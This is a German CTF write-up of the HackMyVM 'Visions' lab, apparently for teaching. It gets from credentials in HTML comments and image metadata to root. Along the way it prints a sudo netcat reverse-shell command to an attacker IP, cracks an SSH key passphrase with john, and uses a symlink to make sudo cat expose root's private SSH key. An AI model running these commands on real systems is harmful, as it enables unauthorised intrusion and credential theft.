# Visions - HackMyVM (Easy)
 
![visions.png](visions.png)

## Übersicht

*   **VM:** Visions
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=visions)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 19. April 2021
*   **Original-Writeup:** https://alientec1908.github.io/visions_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Visions"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Entdeckung des Benutzernamens `alicia` in einem HTML-Kommentar auf dem Webserver. Das zugehörige Passwort `ihaveadream` wurde durch Analyse der Metadaten (tEXtComment) einer Bilddatei (`white.png`) mittels `strings` gefunden. Dies ermöglichte den SSH-Login als `alicia`. Die Privilegieneskalation erfolgte in mehreren Schritten: Von `alicia` zu `emma` durch Ausnutzung einer `sudo`-Regel, die erlaubte, `/usr/bin/nc -e /bin/bash [IP] [PORT]` als `emma` auszuführen. Von `emma` zu `sophia` durch Steganographie (Auslesen von Credentials `sophia:seemstobeimpossible` aus einem Bild mittels `StegOnline`). Von `sophia` zu `isabella` durch eine weitere `sudo`-Regel (`sudo cat /home/isabella/.invisible`), die den verschlüsselten privaten SSH-Schlüssel von `isabella` preisgab. Dieser wurde mit `ssh2john` und `john` geknackt (Passphrase: `invisible`), was einen SSH-Login als `isabella` ermöglichte. Schließlich wurde von `isabella` zu `root` eskaliert, indem `isabella` einen Symlink von `/home/isabella/.invisible` auf `/root/.ssh/id_rsa` erstellte und `sophia` dann erneut ihren `sudo cat`-Befehl ausführte, wodurch der private SSH-Schlüssel von `root` ausgelesen und für den Root-Login verwendet wurde.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   Web Browser (impliziert für Quellcode-Analyse und StegOnline)
*   `strings`
*   `ssh`
*   `sudo`
*   `ls`
*   `nc` (netcat)
*   `StegOnline` (Online-Tool)
*   `cat`
*   `vi` (oder anderer Texteditor)
*   `ssh2john`
*   `john` (John the Ripper)
*   `chmod`
*   `rm`
*   `ln`
*   Standard Linux-Befehle (`id`)
*   *Hinweis: Ein Nmap-Scan wurde im Bericht nicht explizit gezeigt, ist aber typischerweise Teil der Reconnaissance.*

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Visions" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Initial Credential Discovery:**
    *   IP-Findung mit `arp-scan` (`192.168.2.132`).
    *   Untersuchung einer Webseite (Port 80, Details nicht im Log) enthielt einen HTML-Kommentar mit dem Hinweis auf Benutzer `alicia`.
    *   `strings white.png` (Bild vermutlich von der Webseite) offenbarte in den Metadaten (tEXtComment) das Passwort `ihaveadream`.

2.  **Initial Access (SSH als `alicia`):**
    *   Erfolgreicher SSH-Login als `alicia` mit dem Passwort `ihaveadream` (`ssh alicia@vision.hmv`).

3.  **Privilege Escalation (von `alicia` zu `emma` via `sudo nc`):**
    *   `sudo -l` als `alicia` zeigte: `(emma) NOPASSWD: /usr/bin/nc`.
    *   Ausnutzung durch Starten einer Reverse Shell: `sudo -u emma nc -e /bin/bash [Angreifer-IP] 4444`.
    *   Erlangung einer Shell als `emma`.

4.  **Privilege Escalation (von `emma` zu `sophia` via Steganographie):**
    *   Eine (im Log nicht spezifizierte) Bilddatei wurde mit einem Online-Tool (`https://stegonline.georgeom.net/image`) analysiert.
    *   Die Analyse ergab die Credentials `sophia:seemstobeimpossible`.
    *   Login als `sophia` (vermutlich via `su sophia` oder SSH).
    *   User-Flag `hmvicanseeforever` in `/home/sophia/user.txt` gelesen.

5.  **Privilege Escalation (von `sophia` zu `isabella` via `sudo cat` und SSH-Schlüssel-Cracking):**
    *   `sudo -l` als `sophia` zeigte: `(ALL : ALL) NPASSWD: /usr/bin/cat /home/isabella/.invisible`.
    *   `sudo cat /home/isabella/.invisible` gab einen verschlüsselten privaten SSH-Schlüssel (vermutlich für `isabella`) aus.
    *   Der Schlüssel wurde lokal gespeichert (z.B. `id`).
    *   `ssh2john id > hash` konvertierte den Schlüssel in ein für John the Ripper lesbares Format.
    *   `john --wordlist=/usr/share/wordlists/rockyou.txt hash` knackte die Passphrase des Schlüssels: `invisible`.
    *   Erfolgreicher SSH-Login als `isabella` mit dem privaten Schlüssel `id` und der Passphrase `invisible`.

6.  **Privilege Escalation (von `isabella` zu `root` via Symlink und `sudo cat` von `sophia`):**
    *   Als `isabella` wurde ein Symlink erstellt: `rm -f /home/isabella/.invisible; ln -sf /root/.ssh/id_rsa /home/isabella/.invisible`.
    *   Zurück in der `sophia`-Session wurde erneut `sudo cat /home/isabella/.invisible` ausgeführt.
    *   Dies las nun, aufgrund des Symlinks, den Inhalt des privaten SSH-Schlüssels von `root`.
    *   Der Root-SSH-Schlüssel wurde lokal gespeichert (z.B. `idroot`) und die Berechtigungen auf `600` gesetzt.
    *   Erfolgreicher SSH-Login als `root` mit dem privaten Schlüssel `idroot` (`ssh -i idroot root@vision.hmv`).
    *   Root-Flag `hmvitspossible` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Informationslecks in HTML-Kommentaren und Bild-Metadaten:** Enthüllten Benutzernamen und Passwörter.
*   **Steganographie (Online-Tool):** Credentials wurden in einem Bild versteckt.
*   **Unsichere `sudo`-Konfigurationen:**
    *   Erlaubnis, `nc -e` als anderer Benutzer auszuführen, ermöglichte eine Reverse Shell.
    *   Erlaubnis, `cat` auf eine spezifische Datei als `root` (impliziert durch `ALL:ALL`) auszuführen, ermöglichte das Auslesen von Schlüsseln.
*   **SSH-Schlüssel-Cracking:** Passphrasen von verschlüsselten privaten SSH-Schlüsseln wurden geknackt.
*   **Symlink-Attacke:** Ausnutzung einer `sudo cat`-Berechtigung durch Erstellen eines Symlinks auf eine höher privilegierte Datei.
*   **Ketten von Privilegieneskalationen:** Mehrere Benutzerwechsel waren notwendig, um Root-Rechte zu erlangen.

## Flags

*   **User Flag (`/home/sophia/user.txt`):** `hmvicanseeforever`
*   **Root Flag (`/root/root.txt`):** `hmvitspossible`

## Tags

`HackMyVM`, `Visions`, `Easy`, `Steganography`, `Strings`, `SSH`, `sudo Exploitation`, `nc`, `cat`, `SSH Key Cracking`, `ssh2john`, `John the Ripper`, `Symlink Attack`, `Privilege Escalation`, `Linux`
